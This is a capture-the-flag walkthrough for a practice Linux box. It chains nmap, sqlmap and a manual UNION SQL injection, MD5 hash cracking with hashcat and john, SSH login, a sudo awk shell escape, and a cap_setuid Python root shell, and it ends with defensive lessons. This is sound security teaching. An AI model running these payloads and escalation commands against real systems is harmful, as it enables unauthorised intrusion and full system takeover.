gauntlet

Medium Linux box: SQL injection → dump & crack hashes → SSH → a two-step privilege escalation (sudo -u pivot, then a Linux capability). Commands use <target-ip>.

Step 1 / 6

Goal. Capture the user and root flags. Root is a chain: you first pivot to a service account, then abuse a file capability.

Scope. Only attack the IP you were given. Replace <target-ip> everywhere.

1Enumerate

nmap -sC -sV <target-ip>
#   22/tcp ssh ; 80/tcp http (DevHub)

The site is a product catalogue with a search box that hits search.php?q=.

Why it works

  1. User-controlled query parameters that feed a database are the first place to test for injection.

2SQL injection

The q parameter is injectable. Let sqlmap dump the users table:

sqlmap -u "http://<target-ip>/search.php?q=test" -p q --batch --dbs
sqlmap -u "http://<target-ip>/search.php?q=test" -p q --batch -D devhub -T users --dump

A manual UNION works too:

q=%' UNION SELECT 1,username,password FROM users -- -

You recover MD5 password hashes, including mbrown.

Why it works

  1. The query is ... WHERE title LIKE '%$q%' with no parameterization, so you can break out and add a UNION SELECT that returns rows from users.

3Crack the hash

# rockyou: gunzip -k /usr/share/wordlists/rockyou.txt.gz
hashcat -m 0 mbrown.hash /usr/share/wordlists/rockyou.txt
# or
john --format=raw-md5 --wordlist=rockyou.txt mbrown.hash
#   mbrown : chocolate

Why it works

  1. Unsalted MD5 is fast to crack, and a dictionary word falls instantly to a wordlist like rockyou.

4Access → user

ssh mbrown@<target-ip>     # chocolate
cat /home/mbrown/user.txt
user flagFLAG{sqli_dump_crack_login}

Why it works

  1. The cracked application password is reused as the user's system password, so it grants SSH access.

5Escalate, step 1: pivot to svc

sudo -l
#   (svc) NOPASSWD: /usr/bin/awk
sudo -u svc /usr/bin/awk 'BEGIN{system("/bin/sh")}'
# whoami -> svc

Why it works

  1. mbrown may run awk as the svc user without a password.
  2. awk's system() spawns a shell (GTFOBins), so you become svc.

6Escalate, step 2: svc → root

getcap -r / 2>/dev/null
#   /usr/local/bin/python3cap cap_setuid=ep
/usr/local/bin/python3cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
# id -> uid=0(root)
cat /root/root.txt
root flagFLAG{c4p_s3tu1d_pyth0n_r00t}

Why it works

  1. A copy of Python carries the cap_setuid file capability, so it may change its UID to 0 without being SUID-root.
  2. os.setuid(0) then os.system("/bin/bash") gives a root shell.

✓Both flags

userFLAG{sqli_dump_crack_login}
rootFLAG{c4p_s3tu1d_pyth0n_r00t}

Lesson. Parameterize every query, store passwords salted and slow (never plain MD5), scope sudo rules tightly, and audit file capabilities — cap_setuid on an interpreter is as good as SUID root.
